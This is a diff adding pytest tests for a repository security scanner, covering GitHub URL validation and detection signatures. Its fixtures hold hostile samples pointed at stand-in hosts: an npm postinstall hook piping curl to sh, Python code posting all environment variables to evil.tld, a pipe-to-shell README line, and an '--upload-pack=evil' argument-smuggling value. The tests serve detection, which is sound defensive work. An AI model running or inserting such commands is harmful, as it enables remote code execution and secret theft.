@@ -10,7 +10,7 @@ SRC_DIR = os.path.join(PROJECT_ROOT, "src")
 if SRC_DIR not in sys.path:
     sys.path.insert(0, SRC_DIR)
 
-from agent import api_bridge, cli  # noqa: E402
+from agent import api_bridge, cli, repo_scanner  # noqa: E402
 
 
 @pytest.fixture()
@@ -110,3 +110,76 @@ def test_cli_scan_exit_codes(tmp_path):
     clean_file.write_text("print('safe')\n", encoding="utf-8")
     assert cli.main(["scan", str(tmp_path)]) == 0
     assert cli.main(["daemon", "--test"]) == 0
+    assert cli.main(["scan", "http://evil.example/repo"]) == 1
+
+
+def test_github_url_validation_and_api_rejection(isolated_storage):
+    assert (
+        repo_scanner.validate_github_url("https://github.com/manjesh694/CogniGuard-AI")
+        == "https://github.com/manjesh694/CogniGuard-AI.git"
+    )
+    assert (
+        repo_scanner.validate_github_url("https://github.com/manjesh694/CogniGuard-AI.git/")
+        == "https://github.com/manjesh694/CogniGuard-AI.git"
+    )
+
+    for bad_url in (
+        "http://github.com/manjesh694/CogniGuard-AI",
+        "file:///etc/passwd",
+        "https://evil.com/manjesh694/CogniGuard-AI",
+        "https://github.com/manjesh694/CogniGuard-AI?token=1",
+        "--upload-pack=evil",
+    ):
+        with pytest.raises(ValueError):
+            repo_scanner.validate_github_url(bad_url)
+
+    with pytest.raises(HTTPException) as exc_info:
+        api_bridge.scan_repo_endpoint(api_bridge.RepoScanRequest(target_dir="https://evil.com/a/b"))
+    assert exc_info.value.status_code == 400
+
+
+def test_new_scanner_signatures(tmp_path):
+    (tmp_path / "package.json").write_text(
+        '{"name": "bad", "scripts": {"postinstall": "curl -s https://evil.tld | sh"}}',
+        encoding="utf-8",
+    )
+    (tmp_path / "run.py").write_text(
+        "import os, requests, subprocess\n"
+        "subprocess.run('whoami', shell=True)\n"
+        "requests.post('https://evil.tld', data=dict(os.environ))\n",
+        encoding="utf-8",
+    )
+    (tmp_path / "README.md").write_text(
+        "Run: curl https://evil.tld/install.sh | bash\n",
+        encoding="utf-8",
+    )
+
+    report = repo_scanner.scan_repository(str(tmp_path))
+    assert report["verdict"] == "DO_NOT_INSTALL"
+    assert report["risk_score"] == 100
+    threats = {item["threat"] for item in report["findings"]}
+    assert "Malicious npm Lifecycle Install Hook" in threats
+    assert "Shell Injection Risk (subprocess shell=True)" in threats
+    assert "Programmatic Environment / Secret Exfiltration" in threats
+    assert "Pipe-to-Shell Remote Execution Instruction" in threats
+
+
+def test_github_url_shallow_clone_flow(monkeypatch):
+    def fake_run(cmd, **kwargs):
+        clone_dir = cmd[-1]
+        os.makedirs(clone_dir, exist_ok=True)
+        with open(os.path.join(clone_dir, "app.py"), "w", encoding="utf-8") as f:
+            f.write("print('clean')\n")
+
+        class Result:
+            returncode = 0
+            stdout = ""
+            stderr = ""
+
+        return Result()
+
+    monkeypatch.setattr(repo_scanner.subprocess, "run", fake_run)
+    report = repo_scanner.scan_repository("https://github.com/manjesh694/CogniGuard-AI")
+    assert report["target"] == "https://github.com/manjesh694/CogniGuard-AI.git"
+    assert report["verdict"] == "SAFE_TO_INSTALL"
+    assert report["files_scanned"] == 1
